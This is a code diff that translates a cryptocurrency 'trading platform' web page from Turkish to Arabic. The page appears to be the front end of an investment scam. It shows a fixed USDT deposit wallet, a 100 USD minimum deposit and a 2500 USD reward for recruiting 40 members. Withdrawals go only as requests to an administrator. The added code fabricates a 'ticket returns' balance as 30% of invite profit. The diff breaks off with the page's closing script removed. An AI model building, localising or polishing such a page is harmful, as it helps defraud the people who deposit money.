@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trading Platform</title>
+    <title>منصة التداول الرقمية</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,6 +11,7 @@
             color: #ffffff;
             margin: 0;
             padding: 20px;
+            direction: rtl;
         }
         .container {
             max-width: 500px;
@@ -58,68 +59,72 @@
         .stats { margin-top: 10px; }
         .stat-line { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1c2d4a; }
         .stat-line:last-child { border-bottom: none; }
-        .alert { color: #ff5858; font-size: 12px; display: block; margin-top: 5px; }
+        .alert { color: #ff5858; font-size: 12px; display: block; margin-top: 5px; text-align: right; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Trading Platform</h2>
+    <h2>منصة التداول الرقمية</h2>
 
     <!-- 1. قفل اسم المستخدم -->
     <div class="box">
-        <label>👤 Mevcut Kullanıcı Adı:</label>
-        <input type="text" id="username" placeholder="Lütfen kullanıcı adınızı kilitleyin">
-        <button class="btn-blue" onclick="registerUser()">💾 Kaydet ve Kilitle</button>
+        <label>👤 اسم المستخدم الحالي:</label>
+        <input type="text" id="username" placeholder="يرجى حفظ وقفل اسم المستخدم الخاص بك">
+        <button class="btn-blue" onclick="registerUser()">💾 حفظ وقفل الحساب</button>
     </div>
 
-    <!-- 2. المكافأة وأعضاء الفريق -->
+    <!-- 2. الجائزة الكبرى وأعضاء الفريق -->
     <div class="box">
-        <label>🏆 Büyük Ödül (40 üye): 2500 ABD doları</label>
-        <label>Aktif ekip üyeleriniz: <span id="teamCount" style="color:#38ef7d; font-weight:bold;">0 / 40</span></label>
-        <button class="btn-orange" onclick="sendBonusRequest()">📢 Bonusu Yöneticiye Gönder</button>
+        <label>🏆 الجائزة الكبرى (40 عضوا'ً): 2500 دولار أمريكي</label>
+        <label>أعضاء فريقك النشطين: <span id="teamCount" style="color:#38ef7d; font-weight:bold;">0 / 40</span></label>
+        <button class="btn-orange" onclick="sendBonusRequest()">📢 إرسال طلب المكافأة إلى المدير</button>
     </div>
 
-    <!-- 3. لوحة الأرصدة -->
+    <!-- 3. لوحة الأرصدة والأرباح الحية (الخانات الأربعة المنفصلة) -->
     <div class="box">
         <div class="stats">
             <div class="stat-line">
-                <span>💰 Toplam Sermaye:</span>
+                <span>💰 إجمالي رأس المال:</span>
                 <span id="capital" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
             </div>
             <div class="stat-line">
-                <span>📊 Bugünkü Kâr:</span>
+                <span>📊 أرباح اليوم:</span>
                 <span id="todayProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
             </div>
             <div class="stat-line">
-                <span>🎁 Bilet gelirleri ve davetiye ödülleri:</span>
+                <span>🎁 عوائد التذاكر:</span>
+                <span id="ticketProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
+            </div>
+            <div class="stat-line">
+                <span>🎉 مكافأة الدعوة:</span>
                 <span id="inviteProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
             </div>
         </div>
     </div>
 
-    <!-- 4. أزرار Para Çekme (السحب) -->
+    <!-- 4. عمليات السحب الفوري -->
     <div class="box">
-        <label>🚨 Anında Para Çekme İşlemleri Paneli (TRC-20 Ağı):</label>
-        <input type="text" id="withdrawAddress" placeholder="Cüzdan Adresinizi Girin...">
-        <button class="btn-orange" style="margin-bottom:8px;" onclick="withdraw('Toplam Sermayeyi Çek')">💸 Toplam Sermayeyi Çek</button>
-        <button class="btn-blue" style="margin-bottom:8px;" onclick="withdraw('Bugünkü Kârı Çek')">📊 Bugünkü Kârı Çek</button>
-        <button class="btn-blue" onclick="withdraw('Davetiye Ödülünü Çek')">🎁 Davetiye Ödülünü Çek</button>
+        <label>🚨 لوحة عمليات السحب الفوري (شبكة TRC-20):</label>
+        <input type="text" id="withdrawAddress" placeholder="أدخل عنوان محفظة TRC-20 الخاصة بك...">
+        <button class="btn-orange" style="margin-bottom:8px;" onclick="withdraw('Toplam Sermayeyi Çek')">💸 سحب رأس المال بالكامل</button>
+        <button class="btn-blue" style="margin-bottom:8px;" onclick="withdraw('Bugünkü Kârı Çek')">📊 سحب أرباح اليوم</button>
+        <button class="btn-blue" onclick="withdraw('Davetiye Ödülünü Çek')">🎁 سحب مكافأة الدعوة</button>
     </div>
 
-    <!-- 5. طلب Para Yatırma (الإيداع) وزر الدعم الفني -->
+    <!-- 5. إرسال طلب إيداع والدعم الفني -->
     <div class="box">
-        <label>📥 Para Yatırma İsteği (USDT TRC-20):</label>
-        <input type="text" id="walletAddress" value="TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN" readonly style="text-align:center; color:#38ef7d; font-weight:bold;">
-        <button class="btn-blue" style="margin-bottom:12px;" onclick="copyWallet()">📋 Cüzdan Adresini Kopyala</button>
+        <label>📥 طلب إيداع جديد (USDT TRC-20):</label>
+        <input type="text" id="walletAddress" value="TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN" readonly style="text-align:center; color:#38ef7d; font-weight:bold; direction: ltr;">
+        <button class="btn-blue" style="margin-bottom:12px;" onclick="copyWallet()">📋 نسخ عنوان المحفظة</button>
         
-        <label>Yatırmak İstediğiniz Miktar:</label>
-        <input type="number" id="depositAmount" placeholder="Miktar girin...">
-        <span class="alert">⚠ Minimum para yatırma miktarı 100 USD'dir</span>
-        <button class="btn-green" style="margin-top:8px;" onclick="sendDeposit()">⚡ Para Yatırma İsteği Gönder</button>
+        <label>المبلغ المراد إيداعه:</label>
+        <input type="number" id="depositAmount" placeholder="أدخل المبلغ هنا...">
+        <span class="alert">⚠ الحد الأدنى لمبلغ الإيداع هو 100 دولار</span>
+        <button class="btn-green" style="margin-top:8px;" onclick="sendDeposit()">⚡ إرسال طلب إيداع حقيقي</button>
 
-        <!-- زر التلغرام المربوط بحسابك مباشرة -->
-        <a href="https://t.me" target="_blank" class="btn-link btn-telegram">🚀 Telegram Destek Ekibiyle İletişime Geçin</a>
+        <!-- رابط الدعم الفني المباشر المربوط بحسابك -->
+        <a href="https://t.me" target="_blank" class="btn-link btn-telegram">🚀 تواصل مع فريق الدعم الفني عبر تليجرام</a>
     </div>
 </div>
 
@@ -128,7 +133,7 @@
 
     async function registerUser() {
         const username = document.getElementById('username').value.trim();
-        if(!username) return alert('Lütfen geçerli bir kullanıcı adı girin!');
+        if(!username) return alert('يرجى إدخال اسم مستخدم صحيح!');
         try {
             const res = await fetch(`${API_BASE_URL}/api/register-user`, {
                 method: 'POST',
@@ -137,11 +142,11 @@
             });
             const data = await res.json();
             if(data.success) {
-                alert('Kullanıcı adı başarıyla kilitlendi!');
+                alert('تم قفل وحفظ اسم المستخدم بنجاح في قاعدة البيانات!');
                 localStorage.setItem('savedUsername', username);
                 loadUserData(username);
             }
-        } catch(err) { alert('Sunuru bağlantı hatası!'); }
+        } catch(err) { alert('فشل الاتصال بالسيرفر، يرجى المحاولة لاحقاً!'); }
     }
 
     async function loadUserData(username) {
@@ -152,6 +157,7 @@
             document.getElementById('capital').innerText = `USDT ${data.capital.toFixed(2)}`;
             document.getElementById('todayProfit').innerText = `USDT ${data.todayProfit.toFixed(2)}`;
             document.getElementById('inviteProfit').innerText = `USDT ${data.inviteProfit.toFixed(2)}`;
+            document.getElementById('ticketProfit').innerText = `USDT ${(data.inviteProfit * 0.3).toFixed(2)}`; // حسبة افتراضية لعوائد التذاكر
             document.getElementById('teamCount').innerText = `${data.teamCount} / 40`;
         } catch(err) { console.error(err); }
     }
@@ -159,8 +165,8 @@
     async function withdraw(type) {
         const username = localStorage.getItem('savedUsername');
         const address = document.getElementById('withdrawAddress').value.trim();
-        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
-        if(!address) return alert('Lütfen cüzdan adresinizi girin!');
+        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
+        if(!address) return alert('يرجى إدخال عنوان محفظتك لاستلام الأموال!');
         try {
             const res = await fetch(`${API_BASE_URL}/api/orders`, {
                 method: 'POST',
@@ -168,45 +174,45 @@
                 body: JSON.stringify({ username, type, address, amount: 0 })
             });
             const data = await res.json();
-            if(data.success) alert('Çekim talebi gönderildi!');
-        } catch(err) { alert('İşlem başarısız!'); }
+            if(data.success) alert('تم إرسال طلب السحب بنجاح إلى لوحة المشرف!');
+        } catch(err) { alert('فشلت العملية!'); }
     }
 
     async function sendDeposit() {
         const username = localStorage.getItem('savedUsername');
         const amount = parseFloat(document.getElementById('depositAmount').value);
-        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
-        if(isNaN(amount) || amount < 100) return alert('Minimum yatırım miktarı 100 USD\'dir!');
+        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
+        if(isNaN(amount) || amount < 100) return alert('الحد الأدنى لمبلغ الإيداع هو 100 دولار!');
         try {
             const res = await fetch(`${API_BASE_URL}/api/orders`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, type: 'Yatırma', amount, address: 'İsteği Gönderildi' })
+                body: JSON.stringify({ username, type: 'Yatırma', amount, address: 'طلب معلق' })
             });
             const data = await res.json();
-            if(data.success) alert('Para yatırma isteği gönderildi!');
-        } catch(err) { alert('İsteğiniz gönderilemedi.'); }
+            if(data.success) alert('تم إرسال طلب الإيداع بنجاح، يرجى الانتظار موافقة المشرف!');
+        } catch(err) { alert('تعذر إرسال طلب الإيداع.'); }
     }
 
     async function sendBonusRequest() {
         const username = localStorage.getItem('savedUsername');
-        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
+        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
         try {
             const res = await fetch(`${API_BASE_URL}/api/orders`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, type: 'Referans Bonusunu Çek', amount: 2500, address: 'Bonus İsteği' })
+                body: JSON.stringify({ username, type: 'Referans Bonusunu Çek', amount: 2500, address: 'طلب مكافأة' })
             });
             const data = await res.json();
-            if(data.success) alert('Bonus isteği başarıyla gönderildi!');
-        } catch(err) { alert('Hata!'); }
+            if(data.success) alert('تم إرسال طلب مكافأة الجائزة الكبرى بنجاح للمدير!');
+        } catch(err) { alert('حدث خطأ!'); }
     }
 
     function copyWallet() {
         const copyText = document.getElementById("walletAddress");
         copyText.select();
         navigator.clipboard.writeText(copyText.value);
-        alert("Cüzdan adresi kopyalandı: " + copyText.value);
+        alert("تم نسخ عنوان المحفظة بنجاح: " + copyText.value);
     }
 
     setInterval(() => {
@@ -215,12 +221,4 @@
     }, 5000);
 
     window.onload = function() {
-        const savedUsername = localStorage.getItem('savedUsername');
-        if(savedUsername) {
-            document.getElementById('username').value = savedUsername;
-            loadUserData(savedUsername);
-        }
-    }
-</script>
-</body>
-</html>
+        
